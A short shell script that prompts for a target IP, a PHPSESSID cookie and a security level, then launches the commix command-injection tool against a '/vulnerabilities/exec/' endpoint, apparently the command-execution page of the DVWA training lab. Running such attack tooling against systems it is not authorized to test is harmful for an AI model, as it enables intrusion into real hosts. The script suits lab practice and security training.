echo -n "target IP: "
read target
echo -n "Supply Cookie: "
read cookie
echo -n "Security level: "
read lvl
python ./commix.py -u "http://$target/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=Submit" --cookie="PHPSESSID=$cookie;security=$lvl" -v 1
